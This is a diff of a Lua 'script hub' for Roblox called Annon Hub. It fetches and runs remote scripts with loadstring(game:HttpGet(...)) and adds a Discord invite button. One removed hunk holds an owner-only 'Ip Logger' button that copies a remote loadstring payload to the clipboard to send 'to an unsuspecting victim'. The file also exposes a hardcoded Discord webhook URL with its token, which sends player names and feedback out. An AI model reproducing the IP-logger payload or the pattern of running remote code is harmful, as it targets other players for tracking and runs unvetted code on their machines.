@@ -1,7 +1,7 @@
 local Player = game.Players.LocalPlayer
 local sound
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "Annon Hub", IntroIcon = "rbxassetid://9411304331", Icon = "rbxassetid://4370299859", HidePremium = false, IntroText = "Annon Hub", SaveConfig = false, SaveConfig = false, ConfigFolder = "Annon Hub"})
+local Window = OrionLib:MakeWindow({Name = "Annon Hub", IntroIcon = "rbxassetid://9411304331", HidePremium = false, IntroText = "Annon Hub", SaveConfig = false, ConfigFolder = "Annon Hub"})
 -- 4370299859
 -- 6723015609
 
@@ -286,8 +286,14 @@ end
 coroutine.wrap(LocalScript_ScriptfakeXD)()
 end
 
+---------------------- Discord invite from my discord server ----------------------
+function Sunrise()
+	local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
 
-
+	Module.Prompt({ invite = "https://discord.gg/dW5V25hJ", name = "" }) -- name is optional
+	
+	Module.Join("")
+end
 
 
 
@@ -316,21 +322,26 @@ local Profile = Window:MakeTab({
 	Icon = "rbxassetid://9411304331",
 	PremiumOnly = false
 })
+
+
+
 ------- Profile ----------
 local Section = Profile:AddSection({
 	Name = "Profile"
 })
-Profile:AddParagraph("Information","Currently in Alpha, mostly messing around with the UI, not many people will have this script for now, mainly used by me.")
+Profile:AddParagraph("Profile","Annon Hub is the best hub ofc ;) made by Annon#7747 UwW.")
+
 
 ------ Information --------
 local Section = Profile:AddSection({
 	Name = "Information"
 })
-Profile:AddParagraph("Profile","Annon Hub is the best hub ofc ;) made by Annon#7747 UwW.")
+Profile:AddParagraph("Information","Currently in Alpha, mostly messing around with the UI, not many people will have this script for now, mainly used by me.")
+
+------------------------------ whats Annon Hub for
 local Section = Profile:AddSection({
 	Name = "Whats Annon Hub for"
 })
-
 --------- What its for --------
 Profile:AddParagraph("What's Annon Hub for?","Annon Hub is a script hub full of scripts/HUBS.")
 
@@ -401,19 +412,6 @@ Main:AddDropdown({
 	end    
 })
 
-if Player.Name == "DestinnyAngel" then
-local Section = Main:AddSection({
-	Name = "Beam Player"
-})
-Main:AddParagraph("Ip Logger","Send to an unsuspecting victim..")
-Main:AddButton({
-	Name = "Beam Player for me only",
-	Callback = function()
-		setclipboard("loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/infinite/main/.lua'),true))()")
-  	end    
-})
-end
-
 
 
 
@@ -427,7 +425,7 @@ Main:AddButton({
 Name = "CMD-X",
 Callback = function()
 		  loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
-  end    
+end
 })
 
 
@@ -1092,6 +1090,17 @@ function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}
 _G.SendWebHook("https://discord.com/api/webhooks/1001910271163502653/FIdlpMjvcdRAWtNNNnrncPE1z-0sHVSse_lsZkrOR3YcU_hnWGgApl2FYh1XB5SMJ7iy", "***"..Player.Name.."*** has sent feedback: ***".._G.FeedBackString.."***")
 	annon()
 	end
+})
+
+-------------------------- Discord Invite --------------------------
+local Section = Feedback:AddSection({
+	Name = "Discord Invite"
+})
+Feedback:AddButton({
+	Name = "Discord Invite",
+	Callback = function()
+      		Sunrise()
+  	end    
 })
 
 
